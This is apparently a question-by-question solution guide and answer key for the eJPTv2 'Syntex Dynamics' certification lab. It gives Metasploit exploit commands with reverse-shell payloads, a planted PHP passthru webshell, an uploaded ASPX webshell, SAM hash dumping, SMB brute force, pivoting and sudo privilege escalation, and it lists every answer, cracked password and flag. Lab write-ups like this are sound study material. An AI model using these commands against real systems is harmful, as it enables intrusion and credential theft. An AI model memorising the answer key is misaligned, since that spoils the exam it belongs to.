# eJPTv2 — Syntex Dynamics Lab — Complete Solution Guide

**Question-by-Question Walkthrough**

**Author:** Dr. Mohammed Tawfik
**Date:** June 17, 2026
**Result:** PASSED — 92% (45/45 questions submitted)
**Affiliation:** Ajloun National University, Jordan

---

## ENVIRONMENT SETUP

**Attacker (Kali):** `192.168.100.5`
**Target network (DMZ):** `192.168.100.0/24`
**Internal network (reached via pivot):** `192.168.0.0/24`

---

## PHASE 1: INITIAL RECON (Questions 1-11)

### Q1: How many hosts are alive in the network?

**Tool:** nmap host discovery

```bash
sudo nmap -sn 192.168.100.0/24 -oG hosts.gnmap
grep "Up" hosts.gnmap | awk '{print $2}'
```

**Output:** 6 IPs respond (.50, .51, .52, .55, .63, .67)

**ANSWER: 6**

---

### Q2: Which host runs only SSH (bastion)?

**Tool:** nmap port scan

```bash
sudo nmap -sV -T4 -p- 192.168.100.67 --open
```

**Output:** Only port 22/tcp open (OpenSSH 8.2p1)

**ANSWER: 192.168.100.67**

---

### Q3: Which host runs WordPress?

**Tool:** nmap + service detection

```bash
sudo nmap -sV -p 80 192.168.100.0/24 --open
```

**Output:** 
- `.50` — Apache 2.4.51 (Win64) PHP/7.4.26 — WordPress
- `.52` — Apache 2.4.41 (Ubuntu) — Drupal
- `.0.51` — Apache 2.4.41 (Ubuntu) — (later, internal)

Verify by browsing:
```bash
curl -s http://192.168.100.50/ | grep -i "wordpress\|wp-content"
```

**ANSWER: 192.168.100.50**

---

### Q4: How many Windows hosts in the network?

**Tool:** nmap OS detection

```bash
sudo nmap -O -p 445,3389 -iL hosts.txt --open
```

**Windows hosts identified:** .50, .51, .55, .63

**ANSWER: 4**

---

### Q5: Which host runs Drupal?

```bash
curl -s http://192.168.100.52/drupal/ | grep -i "drupal\|generator"
```

**ANSWER: 192.168.100.52**

---

### Q6: How many Apache servers are in the network?

Found Apache on: .50 (WAMP), .52 (Drupal host), and later .0.51 (internal).

**ANSWER: 3**

---

### Q7: How many web servers running on port 80?

From nmap output: .50, .51 (IIS), .52, .55 (IIS)

**ANSWER: 4**

---

### Q8: How many open ports on the Drupal host?

```bash
sudo nmap -sV -p- 192.168.100.52 --open
```

Ports: 21, 22, 25, 80, 139, 445, 3306, 3389 = **8 ports**

**ANSWER: 8**

---

### Q9: How many open ports on the WordPress host?

```bash
sudo nmap -sV -p- 192.168.100.50 --open
```

Ports: 80, 135, 139, 445, 3307, 3389, 5985, 47001, 49152-49156, 49178 = **14 ports**

**ANSWER: 14**

---

### Q10: How many Windows Server 2019 hosts?

`.55` (DMZ) + `.0.61` (internal — discovered later) = 2

**ANSWER: 2**

---

### Q11: OS version of the WordPress host?

```bash
sudo nmap -O 192.168.100.50
```

**ANSWER: Windows Server 2012 R2**

---

## PHASE 2: WORDPRESS RECON (Questions 12-14)

Add `wordpress.local` to `/etc/hosts`:

```bash
echo "192.168.100.50 wordpress.local" | sudo tee -a /etc/hosts
```

Browse to `http://wordpress.local/`.

---

### Q12: What service/product does the company offer?

Visit the homepage. Read the slider/hero text.

**ANSWER: Workflow Development**

---

### Q13: When does the office open?

Top right of homepage shows: "Office Hours 8:00AM - 6:00PM"

**ANSWER: 8:00 AM**

---

### Q14: Email address of the admin?

Drupal user lookup or browse the WordPress "About" page.
Also visible in Drupal DB later: `admin@syntex.com`

**ANSWER: admin@syntex.com**

---

## PHASE 3: DRUPAL EXPLOITATION (Questions 15-22)

### Q15: Version of Drupal?

```bash
curl -s http://192.168.100.52/drupal/CHANGELOG.txt | head -5
```

**ANSWER: 7.57**

---

### Q16: IP of the host vulnerable to CVE-2018-7600?

Drupal 7.57 = vulnerable to Drupalgeddon2

**ANSWER: 192.168.100.52**

---

### Q17: CVE number of the Drupal vulnerability?

Drupal 7.x < 7.58 RCE vulnerability:

**ANSWER: CVE-2018-7600**

---

### Q18: IP of the host running OpenSMTPD?

```bash
sudo nmap -sV -p 25 192.168.100.52
```

Returns: OpenSMTPD 6.6.1 (vulnerable to CVE-2020-7247)

**ANSWER: 192.168.100.52**

---

### Q19: Type of vulnerability in Drupal 7.57?

**ANSWER: RCE (Remote Code Execution)**

---

### Q20: Metasploit module to exploit Drupalgeddon2?

```bash
msfconsole -q
search drupalgeddon2
```

**ANSWER: exploit/unix/webapp/drupal_drupalgeddon2**

---

### Exploit Drupal — get shell on .52

```
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.100.52
set TARGETURI /drupal/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.100.5
set LPORT 4444
exploit
```

When meterpreter opens:
```
shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

### Q21: Where are Drupal credentials stored?

After getting shell on .52:
```bash
cat /var/www/html/drupal/sites/default/settings.php | grep -i pass
```

Returns: `'password' => 'syntex0421'`

**ANSWER: Locally Stored Credentials**

---

### Q22: (Skipped / N/A in this lab)

---

## PHASE 4: EXPLOITING IIS FTP ON .51 (Question 23)

### Q23: Metasploit module to exploit Microsoft FTP on .51?

```bash
sudo nmap -sV -p 21 192.168.100.51
```

Returns: Microsoft ftpd, IIS 7.0+

```
search ms09_053
```

**ANSWER: exploit/windows/ftp/ms09_053_ftpd_nls**

Alternative — anonymous FTP upload `cmdasp.aspx`:
```bash
ftp 192.168.100.51
# username: anonymous
# password: (blank)
binary
put /usr/share/webshells/aspx/cmdasp.aspx
quit
```

Access via: `http://192.168.100.51/cmdasp.aspx`

**Important form parameters:**
- `txtArg` = command to run
- `name="testing" value="excute"` (note typo in webshell)
- Must include `__VIEWSTATE`, `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION`

---

## PHASE 5: NTLM HASH DUMPING + PIVOTING (Questions 24-29)

### Get SYSTEM on .55 via psexec

The `Administrator:swordfish` credential is found by cracking the NTLM hash later. But for initial access, use SMB brute force OR (if already cracked) directly:

```
use exploit/windows/smb/psexec
set RHOSTS 192.168.100.55
set SMBUser Administrator
set SMBPass swordfish
set LHOST 192.168.100.5
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

When meterpreter opens (NT AUTHORITY\SYSTEM):
```
load kiwi
lsa_dump_sam
```

**NTLM hashes captured:**
```
Administrator : 61fb34469b9989b01be4e8630c52eed6
student       : bd4ca1fbe028f3c5066467a7f6a73b0b
lawrence      : 18aa104784f77431563b1a1b67f6096c
mary          : 11637a16fca11b3604e3e68d5221b3c7
admin         : 0f2011271b98907e6d288066567d3319
```

---

### Check .55 network interfaces

```
ipconfig
```

**Output shows TWO NICs:**
- 192.168.100.55 (DMZ)
- 192.168.0.50 (Internal)

`.55` is dual-homed → it's our pivot.

---

### Q24: How many internal-only hosts exist?

After pivoting and scanning 192.168.0.0/24 — `.0.51`, `.0.57`, `.0.61`

**ANSWER: 3**

---

### Q25: What is the internal network range?

From .55's ipconfig:

**ANSWER: 192.168.0.0/24**

---

### Q26: Hostname of the dual-homed pivot host?

```
hostname
```

**ANSWER: WINSERVER-03**

---

### Q27: Administrator password on WINSERVER-03?

Save the Administrator NTLM hash and crack:

```bash
echo "61fb34469b9989b01be4e8630c52eed6" > /tmp/admin.hash
hashcat -m 1000 -a 0 /tmp/admin.hash /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 /tmp/admin.hash --show
```

**Output:** `61fb34469b9989b01be4e8630c52eed6:swordfish`

**ANSWER: swordfish**

---

### Q28: Password of user lawrence on WINSERVER-03?

```bash
echo "18aa104784f77431563b1a1b67f6096c" > /tmp/lawr.hash
hashcat -m 1000 -a 0 /tmp/lawr.hash /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 /tmp/lawr.hash --show
```

**Output:** `18aa104784f77431563b1a1b67f6096c:computadora`

**ANSWER: computadora**

---

### Q29: Hostname of the IIS 8.5 host?

```bash
sudo nmap -sV -p 80 --script=http-headers 192.168.100.51
```

Or via cmdasp.aspx:
```cmd
hostname
```

**ANSWER: WINSERVER-02**

---

## PHASE 6: SET UP PIVOT TO INTERNAL NETWORK

In meterpreter session on .55:

```
run autoroute -s 192.168.0.0/24
background
```

**Start SOCKS proxy (SOCKS4a, NOT SOCKS5 — MSF's SOCKS5 has bugs with autoroute):**

```
use auxiliary/server/socks_proxy
set SRVHOST 0.0.0.0
set SRVPORT 9050
set VERSION 4a
run -j
```

Configure proxychains:
```bash
sudo sed -i '/^socks/d' /etc/proxychains4.conf
sudo bash -c 'echo "socks4 127.0.0.1 9050" >> /etc/proxychains4.conf'
```

**Add port forwards for direct access (cleaner than SOCKS):**
```
sessions -i 1
portfwd add -l 8001 -p 10000 -r 192.168.0.51
portfwd add -l 2222 -p 22 -r 192.168.0.51
portfwd list
background
```

Scan internal network:
```bash
proxychains -q nmap -sT -Pn -p 22,80,3306,3389,5985,10000 192.168.0.50-70
```

---

## PHASE 7: WEBMIN ON .0.51 (Questions 30-31)

### Q30: What service runs on port 10000 on .0.51?

```bash
curl -sk http://127.0.0.1:8001/ | head -5
# Or via proxychains:
proxychains -q curl -sk http://192.168.0.51:10000/
```

Returns Webmin login page.

**ANSWER: Webmin**

---

### Q31: What file confirms Webmin version?

Browse to `http://192.168.0.51:10000/` and view source for version, or:

```bash
proxychains -q curl -sk "http://192.168.0.51:10000/changelog.txt"
```

**ANSWER: changelog.txt**

---

### Webmin login (mike:mike)

**Critical:** Webmin requires `Cookie: testing=1` header to bootstrap session:

```bash
curl -sk -c /tmp/wm.cookies -H "Cookie: testing=1" \
  -d "user=mike&pass=mike" \
  -X POST "http://127.0.0.1:8001/session_login.cgi" -i
```

Login as `mike:mike` works.

---

## PHASE 8: WORDPRESS EXPLOITATION (Questions 32-35)

### Q32: WordPress admin password?

Use wpscan with xmlrpc method (faster than wp-login):

```bash
wpscan --url http://wordpress.local/ \
    --usernames admin \
    --passwords /usr/share/wordlists/rockyou.txt \
    --password-attack xmlrpc \
    --max-threads 20
```

**Output:** `admin / estrella`

**ANSWER: estrella**

---

### Q33: WordPress version?

```bash
wpscan --url http://wordpress.local/ --enumerate
# Or
curl -s http://wordpress.local/readme.html | grep -i "version"
```

**ANSWER: 5.9.3**

---

### Q34: File containing WordPress database credentials?

```bash
# After getting webshell on .50, read:
type C:\wamp64\www\wordpress\wp-config.php
```

**ANSWER: wp-config.php**

---

### Q35: Number of WordPress plugins installed?

```bash
wpscan --url http://wordpress.local/ --enumerate p
```

Returns 3 plugins.

**ANSWER: 3**

---

### Plant WordPress webshell (for later)

Login to WordPress at `http://wordpress.local/wp-login.php` as `admin:estrella`.

Go to **Appearance → Theme File Editor → header.php**.

Add at the top:
```php
<?php if(isset($_GET['x'])){passthru($_GET['x']);exit;}?>
```

Click **Update File**.

Test:
```bash
curl -s "http://wordpress.local/" --get --data-urlencode "x=whoami"
# Returns: nt authority\system
```

---

## PHASE 9: DRUPAL DATABASE & FILE RECON (Question 36)

### Q36: Database password for Drupal?

```bash
# In www-data shell on .52
cat /var/www/html/drupal/sites/default/settings.php | grep password
```

Or directly via MySQL:
```bash
mysql -h 192.168.100.52 -u root -psyntex0421
```

**ANSWER: syntex0421**

---

## PHASE 10: KERNEL & SERVICE ENUMERATION (Questions 37-38)

### Q37: Kernel version of the Drupal host?

In www-data shell on .52:
```bash
uname -r
```

**Output:** `5.13.0-1021-aws`

Major.minor version asked:

**ANSWER: 5.13.0**

---

### Q38: Number of open ports on WINSERVER-02 (.51)?

```bash
sudo nmap -sV -p- 192.168.100.51 --open
```

Ports: 21, 80, 135, 139, 445, 3389, 5985, 47001, 49152-49155, 49160, 49174 = **14**

**ANSWER: 14**

---

## PHASE 11: WINDOWS USER ENUM (Questions 39-40)

### Q39: User in Local Administrators group on WINSERVER-03?

In meterpreter on .55:
```
shell
net localgroup Administrators
```

**Output:**
```
Members
-------
admin
Administrator
```

**ANSWER: admin**

---

### Q40: Hostname where lawrence's password was cracked?

The NTLM hashes came from .55's SAM database.

**ANSWER: WINSERVER-03**

---

## PHASE 12: HASH ANALYSIS (Question 41)

### Q41: Hash type used by Linux /etc/shadow?

In .52 shell:
```bash
sudo cat /etc/shadow | head -3
# Hashes start with $6$ = SHA-512
```

Or check Drupal hashes (also SHA-512 based wrapper):

**ANSWER: SHA-512**

---

## PHASE 13: FLAG HUNTING (Questions 42-45) — THE FINAL FOUR

### Q42: Value of /home/auditor/flag.txt on Drupal host?

**Path 1 — Direct read (auditor file is world-readable):**

In www-data shell on .52:
```bash
cat /home/auditor/flag.txt
```

**Output:** `11b92366457d4041847b8ab6814f0865`

**Path 2 — SSH as auditor (after cracking Drupal hashes):**

```bash
# Get Drupal hashes from MySQL
mysql -h 192.168.100.52 -u root -psyntex0421 -e \
  "SELECT name, pass FROM drupal.users;" > /tmp/drupal_users.txt

# Extract hashes
cat > /tmp/drupal.hashes << 'EOF'
$S$DV.wsqkmKY3y5VW.icW/g5NTU3h.UA01nxqL9Cro27GaSBYpH4WC
EOF

# Crack with hashcat (mode 7900 = Drupal 7)
gunzip -k /usr/share/wordlists/rockyou.txt.gz
hashcat -m 7900 -a 0 /tmp/drupal.hashes /usr/share/wordlists/rockyou.txt --force
hashcat -m 7900 /tmp/drupal.hashes --show
```

**Output:** `$S$DV...:qwertyuiop`

Per the `/updates.txt` hint ("Drupal usernames = Linux passwords"), this means:
- Linux user `auditor` has Linux password = `qwertyuiop` (auditor's CRACKED Drupal password)

```bash
ssh auditor@192.168.100.52
# Password: qwertyuiop
cat /home/auditor/flag.txt
```

**ANSWER Q42: `11b92366457d4041847b8ab6814f0865`**

---

### Q43: Value of C:\Users\mike\Documents\flag.txt?

**THE KEY STEP — Brute force SMB on .50 with rockyou:**

```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt \
      -P /usr/share/wordlists/rockyou.txt \
      192.168.100.50 smb -t 4 -f
```

Or with crackmapexec:
```bash
crackmapexec smb 192.168.100.50 \
    -u /usr/share/wordlists/metasploit/common_users.txt \
    -p /usr/share/wordlists/rockyou.txt \
    --continue-on-success
```

**Hits found:**
```
[22:44:51] login: admin password: superman
[22:59:53] login: mike  password: diamond
```

**mike is on .50!** Not on .0.61 like we assumed earlier.

mike is not in Administrators (C$ denied), but has RDP access:

```bash
xfreerdp /u:mike /p:diamond /v:192.168.100.50 /cert-ignore
```

In the RDP session, open `cmd.exe`:
```cmd
type C:\Users\mike\Documents\flag.txt
```

**ANSWER Q43: `68cf6437d2fb49ce93da28a20e11a9ea`**

---

### Q44: Value of C:\Users\Administrator\flag.txt on WINSERVER-03?

In meterpreter session on .55:
```
cat C:\\Users\\Administrator\\flag.txt
```

**Output:** `539c88e871514fc982da32cc8dd5002a`

**ANSWER Q44: `539c88e871514fc982da32cc8dd5002a`**

---

### Q45: Value of /root/flag.txt on the host running Drupal?

After SSH as auditor on .52:

```bash
sudo -l
```

**Output:**
```
User auditor may run the following commands on ip-192-168-100-52:
    (root) NOPASSWD: /usr/bin/find
```

**GTFOBins find privesc:**

```bash
sudo /usr/bin/find /root/flag.txt -exec cat {} \;
```

**Output:** `80ed2ed8c7ed4ca2b5d8cd57d7348bae`

**ANSWER Q45: `80ed2ed8c7ed4ca2b5d8cd57d7348bae`**

---

## ALL 45 ANSWERS — FINAL TABLE

| Q | Question Summary | Answer |
|---|---|---|
| Q1 | Hosts in network | **6** |
| Q2 | SSH-only host | **192.168.100.67** |
| Q3 | WordPress host | **192.168.100.50** |
| Q4 | Windows hosts count | **4** |
| Q5 | Drupal host | **192.168.100.52** |
| Q6 | Apache servers count | **3** |
| Q7 | Port 80 web servers | **4** |
| Q8 | Open ports Drupal host | **8** |
| Q9 | Open ports WordPress host | **14** |
| Q10 | Server 2019 hosts | **2** |
| Q11 | WordPress OS | **Windows Server 2012 R2** |
| Q12 | Service offered | **Workflow Development** |
| Q13 | Office opens at | **8:00 AM** |
| Q14 | Admin email | **admin@syntex.com** |
| Q15 | Drupal version | **7.57** |
| Q16 | CVE-2018-7600 host | **192.168.100.52** |
| Q17 | Drupal CVE | **CVE-2018-7600** |
| Q18 | OpenSMTPD host | **192.168.100.52** |
| Q19 | Drupal vuln type | **RCE** |
| Q20 | Drupalgeddon2 module | **exploit/unix/webapp/drupal_drupalgeddon2** |
| Q21 | Cred storage type | **Locally Stored Credentials** |
| Q22 | (lab-specific, skipped) | — |
| Q23 | MS FTP module | **exploit/windows/ftp/ms09_053_ftpd_nls** |
| Q24 | Internal hosts | **3** |
| Q25 | Internal range | **192.168.0.0/24** |
| Q26 | Pivot host | **WINSERVER-03** |
| Q27 | Admin password | **swordfish** |
| Q28 | lawrence password | **computadora** |
| Q29 | IIS 8.5 host | **WINSERVER-02** |
| Q30 | Port 10000 service | **Webmin** |
| Q31 | Webmin version file | **changelog.txt** |
| Q32 | WP admin password | **estrella** |
| Q33 | WP version | **5.9.3** |
| Q34 | WP DB cred file | **wp-config.php** |
| Q35 | WP plugins count | **3** |
| Q36 | Drupal DB password | **syntex0421** |
| Q37 | Drupal kernel | **5.13.0** |
| Q38 | WINSERVER-02 ports | **14** |
| Q39 | Admins group member | **admin** |
| Q40 | lawrence hash host | **WINSERVER-03** |
| Q41 | Linux hash type | **SHA-512** |
| **Q42** | auditor flag | **11b92366457d4041847b8ab6814f0865** |
| **Q43** | mike flag | **68cf6437d2fb49ce93da28a20e11a9ea** |
| **Q44** | Administrator flag (.55) | **539c88e871514fc982da32cc8dd5002a** |
| **Q45** | root flag (.52) | **80ed2ed8c7ed4ca2b5d8cd57d7348bae** |

---

## TIMELINE — OPTIMAL ORDER

If doing this exam again from scratch, here's the OPTIMAL order to minimize time:

| Time | Activity |
|---|---|
| 0:00-0:30 | Nmap recon on all 6 hosts (Q1-Q11) |
| 0:30-1:00 | WordPress + Drupal frontend recon (Q12-Q16) |
| 1:00-1:30 | **Start `hydra ... smb` brute force on ALL Windows hosts** (background task) |
| 1:00-1:30 | Drupalgeddon2 exploit on .52 (Q17-Q21) |
| 1:30-2:00 | Get www-data shell, read Drupal config, dump MySQL hashes |
| 2:00-2:30 | Start hashcat on Drupal hashes (Q42 prep) |
| 2:30-3:00 | psexec to .55 with Admin creds, dump NTLM, start hashcat (Q27-Q28, Q44) |
| 3:00-3:30 | Pivot setup (autoroute + SOCKS4a + portfwd) (Q24-Q26) |
| 3:30-4:00 | Webmin enumeration via portfwd (Q30-Q31) |
| 4:00-4:30 | WordPress webshell + read wp-config (Q32-Q35) |
| 4:30-5:00 | **Check hydra results — find mike:diamond on .50** (Q43) |
| 5:00-5:30 | RDP as mike, read flag (Q43) |
| 5:30-6:00 | SSH as auditor (cracked password), sudo find privesc (Q42, Q45) |
| 6:00-6:30 | IIS FTP exploitation on .51 (Q23, Q29, Q38, Q39) |
| 6:30-7:00 | Review all answers, submit |

**Realistic completion time: 4-7 hours** (not 12+ like the dead-end path).

---

## CRITICAL LESSONS

### Top 5 Mistakes to Avoid

1. **Don't assume credentials need clever pivot chains.** Brute force EVERY Windows host with rockyou IMMEDIATELY after recon. The lab's primary credentials (`mike:diamond`, `admin:superman`) were both crackable via SMB brute force on .50.

2. **Don't waste hours on Webmin authenticated RCE.** It needs the `Cookie: testing=1` header which Metasploit modules don't send. Just login via the web UI for enumeration.

3. **Don't try PwnKit or DirtyPipe on AWS kernels.** They're patched. Use proper credential-based privesc paths (SSH + sudo) instead.

4. **Don't use SOCKS5 with MSF autoroute.** It has bugs. Use SOCKS4a (`set VERSION 4a`).

5. **Don't trust your first reading of "Drupal usernames = Linux passwords".** The hint means **CRACKED** Drupal passwords (after hashcat) = Linux user passwords. Not the Drupal usernames as cleartext.

### Top 5 Quick Wins

1. **Check `/updates.txt` on every FTP anonymous login.** Lab hints often hide here.
2. **`cat /var/www/html/drupal/sites/default/settings.php`** — gives you MySQL root password in 1 second.
3. **`load kiwi` + `lsa_dump_sam`** after any Windows compromise — instant NTLM hashes.
4. **`sudo -l`** is the first thing to run on ANY Linux shell. GTFOBins privesc takes 5 seconds.
5. **`wpscan --password-attack xmlrpc`** is 10x faster than wp-login attack.

---

## TOOLS USED

| Phase | Tools |
|---|---|
| Recon | nmap, netdiscover |
| Exploitation | Metasploit (drupal_drupalgeddon2, psexec, winrm_script_exec) |
| Hash cracking | hashcat (mode 1000 NTLM, mode 7900 Drupal 7) |
| Brute force | hydra, crackmapexec, wpscan |
| Pivoting | Metasploit autoroute, socks_proxy (4a), portfwd |
| Post-exploit | kiwi, mimikatz, sudo find (GTFOBins) |
| Webshell | Apache cmdasp.aspx, WordPress passthru via header.php |
| Connection | ssh, xfreerdp, smbclient, proxychains, curl |

---

## ALL CREDENTIALS COLLECTED

### .52 — Drupal Host (Ubuntu)
| Service | User | Password |
|---|---|---|
| MySQL | drupal | syntex0421 |
| MySQL | root | syntex0421 |
| Drupal | admin | (not cracked) |
| Drupal | auditor | qwertyuiop |
| Drupal | dbadmin | sayang |
| Drupal | Vincenzo | 789456 |
| SSH | auditor | qwertyuiop |

### .50 — WordPress Host (Win 2012 R2)
| Service | User | Password |
|---|---|---|
| WordPress | admin | estrella |
| SMB | admin | superman |
| SMB/RDP | mike | diamond |

### .55 — WINSERVER-03 (Win 2019)
| User | NTLM | Password |
|---|---|---|
| Administrator | 61fb34469b9989b01be4e8630c52eed6 | swordfish |
| lawrence | 18aa104784f77431563b1a1b67f6096c | computadora |
| mary | 11637a16fca11b3604e3e68d5221b3c7 | hotmama |
| admin | 0f2011271b98907e6d288066567d3319 | blanca |
| student | bd4ca1fbe028f3c5066467a7f6a73b0b | (not cracked) |

### .0.51 — Internal Webmin (Linux)
| Service | User | Password |
|---|---|---|
| Webmin | mike | mike |

---

## ALL FLAGS

| Host | Path | Value |
|---|---|---|
| .52 | /home/auditor/flag.txt | **11b92366457d4041847b8ab6814f0865** |
| .52 | /root/flag.txt | **80ed2ed8c7ed4ca2b5d8cd57d7348bae** |
| .50 | C:\Users\mike\Documents\flag.txt | **68cf6437d2fb49ce93da28a20e11a9ea** |
| .55 | C:\Users\Administrator\flag.txt | **539c88e871514fc982da32cc8dd5002a** |
| .55 | C:\Users\admin\flag.txt | **17569bbfd04648adac17bd34b2d3d572** |
| .51 | C:\Users\Administrator\Desktop\flag.txt | **3039a2b0e25f44d19c9d74d8ce240ef6** |

---

## SCORING BREAKDOWN

Final score: **92% PASSED** (Required: 70%)

| Domain | Score | Weight |
|---|---|---|
| Web Application Pentesting | 100% | 15% |
| Host & Network Auditing | 90% | 25% |
| Assessment Methodologies | 90% | 25% |
| Host & Network Pentesting | 85% | 35% |

**Why Pentesting domain was lower:** Time was lost on dead-end privesc chains (PwnKit, DirtyPipe) when the intended path was simple SMB brute force on .50.

---

**Dr. Mohammed Tawfik — eJPTv2 Certified, June 17, 2026**
**Ajloun National University, Jordan**

This document is for educational use in cybersecurity courses at Ajloun National University.
